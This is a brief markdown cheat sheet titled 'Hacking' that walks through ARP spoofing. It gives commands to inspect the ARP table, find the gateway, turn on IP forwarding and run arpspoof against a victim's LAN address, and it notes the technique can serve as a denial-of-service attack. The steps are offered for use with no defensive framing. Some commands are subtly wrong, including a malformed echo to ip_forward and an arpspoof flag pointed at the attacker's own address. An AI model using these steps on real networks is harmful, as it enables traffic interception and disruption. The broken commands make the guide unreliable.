# Hacking: 

## ARP spoofing: 
1. Check ARP table:
```
arp
```
2. Check default gateway LAN IP address: 
```
ip r | grep default
```
3. Change the attacker machine into a rounter 
```
echo > l /proc/sys/net/ipv4/ip_forward
```
4. Process ARP spoofing: 
```
sudo arpspoof -i eth0 -t [victim LAN IP address] -r [attacker machine LAN IP address]
```

> Can use ARP spoofing as DoS attack.